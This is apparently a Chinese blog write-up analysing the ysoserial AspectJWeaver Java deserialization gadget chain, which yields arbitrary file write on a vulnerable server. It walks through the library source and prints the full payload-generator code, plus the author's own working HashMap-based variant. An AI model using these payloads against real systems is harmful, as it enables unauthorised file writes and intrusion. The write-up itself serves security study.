---
layout: post
title: Web-Java-反序列化漏洞-ysoserial-AspectJWeaver
excerpt: "面向切面编程因为可以在不改变别人代码的情况下在别人代码执行之前或之后切入自己的逻辑而被广泛应用于大型项目开发，本文将简要介绍AOP中所涉及到的反序列化漏洞，该漏洞属于文件上传漏洞"
date:   2021-07-26 11:51:00
categories: [CTF]
comments: true
---

## 背景知识

1. *ysoserial*包含了许多针对通用Java依赖包的小工具链，可以在正常情况下通过使目标程序进行不安全的反序列化实现攻击利用。

2. Gadgets

   ```java
   /* 
    *   Gadget chain:
    *      HashSet.readObject()
    *          HashMap.put()
    *              HashMap.hash()
    *                  TiedMapEntry.hashCode()
    *                      TiedMapEntry.getValue()
    *                          LazyMap.get()
    *                              SimpleCache$StorableCachingMap.put()
    *                                  SimpleCache$StorableCachingMap.writeToPath()
    *                                      FileOutputStream.write()
    */
   ```
   
3. Java序列化

   * Java原生序列化和反序列化将属性的类名同时写入到了序列化流中
   * Java反序列化时会调用ObjectInputStream的readObject()方法来进行反序列化
   * 无论反序列化是否成功，只要读取到类名就会加载这个类，如果该类有自定义的readObjec()就执行自定义的readObject()方法，如果没有就按照默认的readObject()流程执行，因此只要readObject()存在调用点，无论业务代码中是否使用了这些类，都会执行readObject()过程从而执行恶意代码

## 验证过程

* 配置环境

  * `org.aspectj`:`aspectjweaver:1.9.2`
  * `commons-collections`:`commons-collections:3.2.2`
  * jdk1.8(非必须)

* 运行Payload

  * IDEA控制台效果，没有出现报错

  * 文件顺利写入

    ![AspectJWeaver攻击效果图](https://monkeydatabase.github.io/img/image-20210801150014892.png)


## 攻击原理

1. 本例反序列化的目标类型是HashSet，首先查看`Hashset.readObject()`

   * 首先读取隐藏的序列化魔数
   * 分别读取了HashSet的容量capacity、加载因子loadFactor、目前成员数量size，之后按照size至少占capacity的25%的准则重新计算capacity，因为HashSet底层是HashMap，因此HashSet的capacity和HashMap的capacity一样必须是$2^{n}$。
   * 按照HashSet是LinkedHashset还是HashSet构建底层存储结构
   * 按照读取的size，依次从ObjectInputStream中反序列化HashSet成员类型E的实例，然后把该实例作为key，HashSet类中一个Public Static Final在HashSet类加载入JVM时创建的Object实例作为value，将这组(key, value)放入底层存储结构中

   ```java
   private void readObject(java.io.ObjectInputStream s)
       throws java.io.IOException, ClassNotFoundException {
       // Read in any hidden serialization magic
       s.defaultReadObject();
   
       /* Leave out lots of codes for check loadfactor、capacity、size*/
   
       // Create backing HashMap
       map = (((HashSet<?>)this) instanceof LinkedHashSet ?
              new LinkedHashMap<E,Object>(capacity, loadFactor) :
              new HashMap<E,Object>(capacity, loadFactor));
   
       // Read in all elements in the proper order.
       for (int i=0; i<size; i++) {
           @SuppressWarnings("unchecked")
           E e = (E) s.readObject();
           map.put(e, PRESENT);
       }
   }
   ```

2. 调用`HashMap.put()`，其中调用了`key.hashCode()`计算h，用h的高16位与低16位进行异或，从而得出最终的hash。因为此时key为TiedMapEntry类型，因此会调用TiedMapEntry的hashCode方法

   ```java
   public V put(K key, V value) {
       return putVal(hash(key), key, value, false, true);
   }
   
   static final int hash(Object key) {
       int h;
       return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
   }
   ```

3. 调用`TiedMapEntry.hashCode()`，

   * TiedMapEntry有两个final修饰的成员常量，一个是Map类型的map，一个是Object类型的key

   * 在Key和Map中Key对应的Value不为空时，使用Key和Value的hashCode()进行异或来计算该TiedMapEntry的hashCode()
   * 当Key或Value为空时，其参与异或运算的值为0
   * 此时触发点一共有如下三个
     * map.get()：因为LazyMap可以在get时调用Transformer调用系统函数，类似情形可见CC1调用链
     * key.hashCode()/value.hashCode()：因为hashCode()计算也可能触发出网等动作，类似情形可见[URLDNS调用链](https://monkeydatabase.github.io/articles/2021-05/ctf-java-deserialization-URLDNS)

   ```java
   public int hashCode() {
       Object value = getValue();
       return (getKey() == null ? 0 : getKey().hashCode()) ^
           (value == null ? 0 : value.hashCode()); 
   }
   
   public Object getValue() {
       return map.get(key);
   }
   ```

4. 因为构造TiedMapEntry的Map是LazyMap，因此调用了`LazyMap.get()`

   * LazyMap是通过传入一个Map和Transformer构建起来的
   * 当Map中不含有key时，对使用Transformer类根据key创造一个value并放入LazyMap管理的Map中

   ```java
   public static Map decorate(Map map, Transformer factory) {
       return new LazyMap(map, factory);
   }
   
   protected LazyMap(Map map, Transformer factory) {
       super(map);
       if (factory == null) {
           throw new IllegalArgumentException("Factory must not be null");
       }
       this.factory = factory;
   }
   
   public Object get(Object key) {
       if (map.containsKey(key) == false) {
           Object value = factory.transform(key);
           map.put(key, value);
           return value;
       }
       return map.get(key);
   }
   ```

5. 此时，LazyMap管理的类是`org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap`，是AspectJWeaver包中的SimpleCache类的一个静态内部类StoreableCachingMap，该类的put函数被重写了

   * StoreableCachingMap的key是被缓存的对象，value是该对象被缓存的路径
   * 当put()接受的valueBytes不是"idem"(SimpleCache中定义的字符串常量)时，会调用writeToPath()
   * writeToPath()将key与通过StoreableCachingMap构造函数传进来的folder进行拼接后作为输出路径，将value作为文件内容，进行文件写入

   ```java
   private static class StoreableCachingMap extends HashMap {
       private String folder;
       private static final String CACHENAMEIDX = "cache.idx";
   
       private long lastStored = System.currentTimeMillis();
       private static int DEF_STORING_TIMER = 60000; //ms
       private int storingTimer;
   
       private transient Trace trace;
       private void initTrace(){
           trace = TraceFactory.getTraceFactory().getTrace(StoreableCachingMap.class);
       }
   
       private StoreableCachingMap(String folder, int storingTimer){
           this.folder = folder;
           initTrace();
           this.storingTimer = storingTimer;
       }
   
       @Override
       public Object put(Object key, Object value) {
           try {
               String path = null;
               byte[] valueBytes = (byte[]) value;
   
               if (Arrays.equals(valueBytes, SAME_BYTES)) {
                   path = SAME_BYTES_STRING;
               } else {
                   path = writeToPath((String) key, valueBytes);
               }
               Object result = super.put(key, path);
               storeMap();
               return result;
           } catch (IOException e) {
               trace.error("Error inserting in cache: key:" +
                           key.toString() + "; value:" + value.toString(), 
                           e);
               Dump.dumpWithException(e);
           }
           return null;
       }
   
       private String writeToPath(String key, byte[] bytes) throws IOException {
           String fullPath = folder + File.separator + key;
           FileOutputStream fos = new FileOutputStream(fullPath);
           fos.write(bytes);
           fos.flush();
           fos.close();
           return fullPath;
       }
   
   }
   ```

6. 接下来分析ysoserial的AspectJWeaver Payload

   ```java
   public class AspectJWeaver implements ObjectPayload<Serializable> {
   
       public Serializable getObject(final String command) throws Exception {
           // 从命令行获取用户输入，并用分号作为分隔符分开
           int sep = command.lastIndexOf(';');
           if ( sep < 0 )
               throw new IllegalArgumentException("Command format is: <filename>;<base64 Object>");
           String[] parts = command.split(";");
           String filename = parts[0];
           byte[] content = Base64.decodeBase64(parts[1]);
   
           // StoreableCachingMap是AspectJWeaver中SimpleCache的一个静态内部类
           // 使用反射获取到其构造方法
           Constructor ctor = Reflections.getFirstCtor(
               "org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
           // 传入构造参数，其中第一个参数是StoreableCachingMap的folder参数，是文件上传的目标目录
           // 修改第一个参数可以定义发起攻击时文件在被攻击机器文件系统中的位置
           Object simpleCache = ctor.newInstance(".", 12);
           // ConstantTransformer将构造参数作为transform的结果返回
           Transformer ct = new ConstantTransformer(content);
           // 使用ct作为StoreableCachingMap的Transformer
           // 便于调用lazyMap调用get()在Key不存在时生成以“该key为key”:“以用户输入内容作为value”的Entry
           // 并将该Entry插入StoreableCachingMap
           Map lazyMap = LazyMap.decorate((Map)simpleCache, ct);
           // TiedMapEntry的构造函数为一个Map和一个Key
           // TiedMapEntry计算hashCode()时会调用Map.getValue(Key)从而触发lazyMap.get(filename)
           TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);
           // 然而TiedMapEntry本身并没有重写readObject(),因此需要寻找方法触发它的hashCode()
           
           // 创建一个HashSet，因为它重写了readObject()
           // 要触发它读取集合元素之后调用HashMap.put()需要它的size不为0
           // 指定初始化capacity为1，自动调整后capacity为2
           HashSet map = new HashSet(1);
           map.add("foo");
           
           // 获取HashSet底层存储数据的HashMap
           Field f = null;
           try {
               f = HashSet.class.getDeclaredField("map");
           } catch (NoSuchFieldException e) {
               f = HashSet.class.getDeclaredField("backingMap");
           }
           Reflections.setAccessible(f);
           HashMap innimpl = (HashMap) f.get(map);
   
           // 获取HashMap底层存储数据的Node<K, V>[]
           Field f2 = null;
           try {
               f2 = HashMap.class.getDeclaredField("table");
           } catch (NoSuchFieldException e) {
               f2 = HashMap.class.getDeclaredField("elementData");
           }
           Reflections.setAccessible(f2);
           Object[] array = (Object[]) f2.get(innimpl);
   
           // 因为此时HashMap的capacity为2，所以只用访问Node集合的索引为0和1的位置
           Object node = array[0];
           if(node == null){
               node = array[1];
           }
   
           // 获取Node对象的key属性
           Field keyField = null;
           try{
               keyField = node.getClass().getDeclaredField("key");
           }catch(Exception e){
               keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
           }
           Reflections.setAccessible(keyField);
           // 将构造的TiedMapEntry赋值给Hashset->HashMap->Node
           // 使HashMap反序列化时调用TiedMapEntry的hashCode()方法
           keyField.set(node, entry);
   
           // 返回payload
           return map;
       }
   ```

   


## 独立思考

### 1、为什么HashMap的capacity必须是2的n次方？

因为位运算运算速度快，每个Object通过HashMap.hash(key)得到的hash(key)需要映射到HashMap底层的Entry\<K, V\>\[\]中，如果采用hash(key)%length的方式时间效率远低于位运算，因此HashMap底层的capacity选用了2的n次方的策略。

```java
static int indexFor(int h, int length) {
    return h & (length-1);
}
```

### 2、为什么本例需要使用HashSet作为入口，使用HashMap作为第一步入口可不可以？

本例用HashMap也是可以的，修改后的代码如下，效果已经过验证

```java
public class MyAspectJWeaver implements ObjectPayload<Serializable> {

    public Serializable getObject(final String command) throws Exception {
        int sep = command.lastIndexOf(';');
        if ( sep < 0 ) {
            throw new IllegalArgumentException("Command format is: <filename>:<base64 Object>");
        }
        String[] parts = command.split(";");
        String filename = parts[0];
        byte[] content = Base64.decodeBase64(parts[1]);

        Constructor ctor = Reflections.getFirstCtor(
            "org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Object simpleCache = ctor.newInstance(".", 12);
        Transformer ct = new ConstantTransformer(content);
        Map lazyMap = LazyMap.decorate((Map)simpleCache, ct);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);

        HashMap map = new HashMap(1);
        map.put("foo", new Object());
        
        // 获取Node[]
        Field mf = HashMap.class.getDeclaredField("table");
        Reflections.setAccessible(mf);
        Object[] array = (Object[]) mf.get(map);
        // 获取非空Node
        Object node = array[0];
        node = (node == null) ? array[1]:node;
        // 获取Node的key
        Field mkf = node.getClass().getDeclaredField("key");
        Reflections.setAccessible(mkf);
        // 将TiedMapEntry写入该node的key字段
        mkf.set(node, entry);
        return map;

    }

    public static void main(String[] args) throws Exception {
        args = new String[]{"ahi.txt;YWhpaGloaQ=="};
        PayloadRunner.run(AspectJWeaver.class, args);
    }
}
```

## 产生过的疑问

1. 为什么HashMap的capacity必须是2的n次方？
2. 为什么本例需要使用HashSet作为入口，使用HashMap作为第一步入口可不可以？
